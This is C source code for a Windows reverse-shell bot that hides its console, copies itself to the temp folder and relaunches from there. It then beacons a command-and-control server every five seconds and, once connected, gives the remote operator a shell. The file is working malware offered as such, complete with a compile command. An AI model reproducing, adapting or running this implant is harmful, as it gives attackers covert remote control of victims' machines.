#include <winsock2.h>
#include <windows.h>
#include <ws2tcpip.h>
#include <stdio.h>
#include "config.h"
#include "modules.h"

/* IMPORTANT: need to link with ws2_32 (i686-w64-mingw32-gcc revshell.c -o revshell.exe -lws2_32) */

/* -- static function prototypes */
static void copy(char *src_path, char *dst_path);
static void beacon();
static int open_connection(SOCKET c2_sock);

int main(int argc, char* argv[])
{
  char curr_path[MAX_PATH];
  char temp_path[MAX_PATH];
  char target_path[MAX_PATH + FILENAME_MAX + 1]= {0};
  int exists;
  HMODULE handle;

  FreeConsole();

  /*
  ** Copy bot to temp folder before beaconing C2 server
  */
	
  /* get the current path to the executable */
  handle= GetModuleHandleA(NULL);
  GetModuleFileNameA(handle, (char *)curr_path, MAX_PATH);

  /* find the windows temp path and append the file name */
  GetTempPath(MAX_PATH, temp_path);
  strcat(target_path, temp_path);
  strcat(target_path, strrchr(curr_path, '\\') + 1);
  
  /* check if the bot already exists in the system directory */
  exists= (strcmp(target_path, curr_path) == 0);

  if (!exists) /* copy to system path and execute*/
    {
      copy(curr_path, target_path);
      ShellExecute(NULL, "open", target_path, NULL, 0, 0);
    }
  else { /* beacon c2 if bot exists in temp folder */
      beacon();
    }
  
  return 0;
}

/* continually beacon the C2 until a connection is made */
static void beacon()
{
  SOCKET sock;
  struct sockaddr_in server;
  WSADATA wsa;

  while (1)
    {
      Sleep(5000);
      
      /* initialize win sock version*/
      if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0)
	exit(0);
      
      if ((sock= WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP,
			   NULL, (unsigned int)NULL, (unsigned int)NULL)) != INVALID_SOCKET)
	{
	  server.sin_addr.s_addr= inet_addr(C2SERVER);
	  server.sin_family= AF_INET;
	  server.sin_port= htons(C2PORT);
	  
	  if (WSAConnect(sock, (SOCKADDR *)&server, sizeof(server), NULL, NULL, NULL, NULL)
	      != SOCKET_ERROR)
	    {
	      open_connection(sock);
	    }
	}

      WSACleanup();
      closesocket(sock);
    }
}

/* hold connection with c2 for module execution until exit command recieved */
static int open_connection(SOCKET c2_sock)
{
  char msg_buffer[1024]= {0};
  int recv_size;
  
  /* get data from c2 before continuing */
  if ((recv_size= recv(c2_sock, msg_buffer, 1024, 0)) != SOCKET_ERROR)
    {
      spawn_shell((HANDLE)c2_sock);
    }
  
  return 0;
}

/* open a src file and copy it to the dst path */
static void copy(char *src_path, char *dst_path)
{
  FILE *src_file, *dst_file;
  unsigned char buff[8192];
  size_t bytes;

  src_file= fopen(src_path, "rb");
  dst_file= fopen(dst_path, "wb");
    
  while ((bytes= fread(buff, 1, sizeof(buff), src_file)) > 0)
      fwrite(buff, 1, bytes, dst_file);
    
  fclose(src_file);
  fclose(dst_file);
}



